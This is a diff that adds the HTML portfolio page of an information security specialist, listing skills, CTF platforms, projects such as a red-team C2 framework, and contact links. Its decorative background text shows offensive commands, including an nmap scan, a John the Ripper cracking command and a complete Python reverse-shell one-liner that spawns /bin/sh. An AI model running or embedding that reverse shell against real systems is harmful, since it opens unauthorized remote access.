@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Artur Lukianov - Personal Website</title>
+    <link rel="stylesheet" type="text/css" href="css/style.css" />
+</head>
+
+<body>
+    <div class="content">
+        <header>
+            <h1 class="glitch">
+                <span aria-hidden="true">Artur Lukianov</span>
+                Artur Lukianov
+                <span aria-hidden="true">Artur Lukianov</span>
+            </h1>
+            <h2 class="glitch">
+                <span aria-hidden="true">Information Security Specialist</span>
+                Information Security Specialist
+                <span aria-hidden="true">Information Security Specialis</span>
+            </h2>
+        </header>
+        <main>
+            <div class="section">
+                <h3 class="glitch-static">
+                    <span aria-hidden="true">Bio</span>
+                    Bio
+                    <span aria-hidden="true">Bio</span>
+                </h3>
+                <p>
+                    I am Information Security Specialist with wide range of skills:
+                <ul>
+                    <li>Web Security Assesment</li>
+                    <li>Reverse Engineering</li>
+                    <li>Penetration Testing</li>
+                    <li>Code Auditing</li>
+                </ul>
+
+                You can find me on:
+                <ul>
+                    <li>HackTheBox</li>
+                    <li>TryHackMe</li>
+                    <li>Standoff365</li>
+                </ul>
+
+                I have 2 year working experience in Cybersecurity field and more than 5 years of participating in CTFs.
+                </p>
+            </div>
+            <div class="section">
+                <h3 class="glitch-static">
+                    <span aria-hidden="true">Projects</span>
+                    Projects
+                    <span aria-hidden="true">Projects</span>
+                </h3>
+                <ul style="text-align: center;">
+                    <li class="project"><span class="project-name">semargl</span> - a powerful and versatile C2
+                        framework tailored for Red Team operations</li>
+                    <img src="./media/semargl.png" width="80%" />
+                    <li class="project"><span class="project-name">BBPipeline</span> - an automation framework to manage
+                        routine operations like reconnaisance during penetration testing or bug bounty</li>
+                    <img src="./media/bbpipeline.png" width="80%" />
+                    <li class="project"><span class="project-name">OSINT help bot</span> - a telegram bot for helping
+                        with OSINT (Open Source Intelligence) investigations</li>
+                    <img src="./media/osint.png" width="80%" />
+                </ul>
+            </div>
+            <div class="section">
+                <h3 class="glitch-static">
+                    <span aria-hidden="true">Social Media</span>
+                    Social Media
+                    <span aria-hidden="true">Social Media</span>
+                </h3>
+
+                <a href="https://github.com/ArturLukianov/" id="gh-link">
+                    <span>
+                        <object data="./media/github.svg" type="image/svg+xml"></object>
+                    </span>
+                </a>
+                <a href="mail:a.lukianov@innopolis.university" id="email">
+                    <span>
+                        <object data="./media/mail.svg" type="image/svg+xml"></object>
+                    </span>
+                </a>
+                <a href="https://t.me/magnummalum" id="tg-link">
+                    <span>
+                        <object data="./media/telegram.svg" type="image/svg+xml"></object>
+                    </span>
+                </a>
+
+            </div>
+        </main>
+    </div>
+    <div class="decoration">
+        <h4 style="top: 10px; left:20px"># whoami</h4>
+
+        <h4 style="top: 50%; left:50%">nmap -sC -sV -oN scan-fast.txt 10.10.10.10</h4>
+
+        <h4 style="top: 5%; left:10%">msfconsole</h4>
+
+        <h4 style="top: 70%; right:10%">vim shellcode.c</h4>
+
+        <h4 style="top: 20%; left:30%">sudo john --mask='?d?d?d?d?d?d?d?d?d?d' --format=Raw-SHA256 hashes.txt</h4>
+
+        <h4 style="bottom: 10px; right:10px">python3 -c 'import
+            os,pty,socket;s=socket.socket();s.connect(("localhost",8443));[os.dup2(s.fileno(),f)for f
+            in(0,1,2)];pty.spawn("/bin/sh")'</h4>
+    </div>
+</body>
+
+</html>
